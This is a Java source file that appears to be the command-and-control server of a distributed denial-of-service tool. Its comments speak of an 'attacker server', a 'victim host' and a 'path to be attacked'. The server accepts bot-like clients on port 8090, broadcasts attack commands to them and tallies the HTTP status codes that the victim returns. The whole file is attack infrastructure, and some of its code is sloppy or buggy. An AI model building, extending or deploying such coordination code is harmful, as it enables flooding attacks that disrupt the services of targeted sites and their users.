package main;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.Semaphore;
import java.util.concurrent.atomic.AtomicBoolean;


// The socket connector class and th role of this class is to create multiple socket connections and facilitate a 
//  method to connect with those clients through the socket connection 
// This implementation is under the server connection.	
public class socket_connector extends Thread{
	
	// this array list is to be used for late connecting clients 
	//	this list contains a list of string commands which are passed to the rest of clients and 
	//	this will be forwarded for those late clients when they get connected to the attacker server.
	ArrayList<String>  messages = new ArrayList<String >();
	// clients
	public ArrayList<Client> clients;
	// clientsCount 
	public int clientsCount=0;
	// host representing the victim host address 
	public String host ;
	// port represents the victim machine port address 
	public int port =0;
	// Path represents the victim machine path to be attacked
	public String path;
	//	Below this line i am going to place the list of results which i get from the clients and My Status Code.
	
	// responses represent the victim responded status codes and their occurance count.
	public HashMap<Integer   , Integer >  responses;
	
	
	public void broadcastMessage(String message ) {
		this.messages.add(message);
		for(int a=0; a < this.clients.size() ; a++) {
			Client client = this.clients.get(a);
			client.writeMessage(message);
		}
	}
	
	
	@Override
	public void run() {
		// responses ... 
		this.responses= new HashMap<Integer , Integer >(); 
		this.clients = new ArrayList<Client>();
		try {
			ServerSocket ser = new ServerSocket(8090);
			System.out.println("Waiting to a client s"  );
			while( true ) {
				Socket socket = ser.accept();
				// This is the new coming socket. wherein, each client in the server will be represented by a single thread.
				Client cl  = new Client(socket   , this);
				cl.start();
				for (String mes : messages ) {
					cl.writeMessage(mes);
				}
				this.clients.add(cl);
			}
		} catch (Exception e) {
			System.out.println("Ooops  1" + e.getMessage());
		}
	}
	int counter= 0;
	Semaphore semaphore = new Semaphore(1);
	public ArrayList<Integer[]> getStatus() {
		try {
			semaphore.acquire();
		} catch (InterruptedException e) {
			return new  ArrayList<Integer[]>();
		}
		ArrayList<Integer[]> results = new  ArrayList<Integer[]>();
		Iterator iterator = responses.entrySet().iterator();
    	while(iterator.hasNext()) {
    		Map.Entry mapElement = (Map.Entry)iterator.next();
    		Integer[] res = new Integer[2];
        	res[0]= (Integer)mapElement.getKey(); 
        	res[1]= (Integer)mapElement.getValue();
        	results.add(res);
    	}
		semaphore.release();
		return results ;
	}
	
	public synchronized void addStatus(int code  , int counts ) {
			try {
				semaphore.acquire();
			} catch (InterruptedException e) {
				return;
			}
			Integer val = this.responses.get(code );
			this.responses.put(code,  val == null ? counts : val+counts);
			System.out.println(" From Client Status Code "  + code + "   Occurance   : " + counts );
			semaphore.release();
	}
	
	public void removeMe( Client cl    ) {
		// Stop the thread and close the connection , and delete the client thread
		clients.remove(cl);
		clientsCount--;
		System.out.print("----------------------------------REMOVED-----------------------------");
	}
	
}

// Client is a class containing the client connection with in it.
// this client class holds the information
// those informations are the socket  , holder   , bufferedWriter  , bufferedReader informations .
class Client extends Thread {
	public Socket socket;
	public socket_connector connector ;
	public BufferedWriter bufferedWriter ;
	public BufferedReader bufferedReader ;
	
	public Client(Socket socket  , socket_connector server  ) {
		this.socket = socket ;
		this.connector = server;
		if (this.socket == null  || this.connector==null ) {
			return; 
		}
		int count = 0 ; 
		boolean val = false ;
		do {
			try {
				this.bufferedReader = new BufferedReader( new InputStreamReader(socket.getInputStream()));
				this.bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
				if(this.bufferedReader != null  && this.bufferedWriter != null ) {
					val = true ; 
				}
			}catch(Exception e ) {
				count+=1;
				if (count ==10) {
					return ; 
				}
				System.out.println("While Creating buffered Writeres "+ e.getMessage());
			}
		}while(false == val );
	}
	
	// This method is to be used by the server to broadcast a message to the clients.
	public void writeMessage(String message ) {
		try {
			this.bufferedWriter.write(message+ "\n");
			this.bufferedWriter.flush();
		}catch(Exception e) {
			System.out.println("Error whle writing a message to client "  + e.getMessage());
		}
	}
	// This method loops for ever until the main server stops it.
	// this loop listens a message from each client and post it to the holding thread.
	@Override
	public void run() {
		while(socket.isConnected()   && !socket.isClosed() ) {
			System.out.println(" Is Closed :"+ socket.isClosed()+"\n Is Connected  : "+socket.isConnected()+"\n Is Bount"+socket.isBound() + " Is Null :"+socket==null );
			if(socket==null|| socket.isInputShutdown() || socket.isClosed()) {
				// Tasks to be performed before returning the loop.
				this.socket=null; 
				this.bufferedReader= null;
				this.bufferedWriter = null;
				return;
			}
			if( this.bufferedReader == null ) {
				try {
					this.bufferedReader = new BufferedReader( new InputStreamReader(socket.getInputStream()));
				}catch(Exception e ) {	
					continue;
				}
			}
			String message ;
			try {
				message = bufferedReader.readLine();
				String[] formats = message.split(";");
				if(formats.length==0) {
					continue;
				}
				if(formats[0].equals("sd")) {
					int statusCode = Integer.parseInt(  formats[1].trim() );
					if(statusCode <=100 || statusCode >700) {
						continue;
					}
					int count = Integer.parseInt(formats[2].trim());
					if (count<0) {continue;}
					this.connector.addStatus(statusCode , count);
					System.out.println("The Status Code ...  Status Code : "+statusCode+ "  Occurance :  "  + count );
				}
			}catch(Exception e ) {
				System.out.println( " 169: Socket_conn  "+ e.getMessage() );
				break;
			}
		}
		try {
			socket.close();
		} catch ( Exception e) {
			e.printStackTrace();
		}
		connector.removeMe(this);
	}
}
